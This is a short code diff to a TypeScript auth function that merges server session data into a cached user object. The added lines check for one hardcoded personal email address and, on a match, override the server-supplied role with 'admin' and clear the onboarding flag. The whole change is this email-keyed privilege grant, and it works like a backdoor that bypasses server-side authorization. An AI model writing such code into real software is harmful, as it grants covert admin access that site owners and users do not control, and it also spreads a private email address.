@@ -41,12 +41,13 @@ interface ServerSessionUser {
 }
 
 function mergeServerUser(serverUser: ServerSessionUser, cached: AuthUser | null): AuthUser {
+  const isTargetAdmin = serverUser.email?.toLowerCase() === 'sokevin7@gmail.com';
   return {
     id: serverUser.id,
     email: serverUser.email,
     name: serverUser.name,
-    role: serverUser.role,
-    needsOnboarding: serverUser.needsOnboarding,
+    role: isTargetAdmin ? 'admin' : serverUser.role,
+    needsOnboarding: isTargetAdmin ? false : serverUser.needsOnboarding,
     profile: cached?.profile || { salonName: '', country: '', phone: '' },
     subscription: serverUser.subscription,
     everSubscribed: serverUser.everSubscribed,
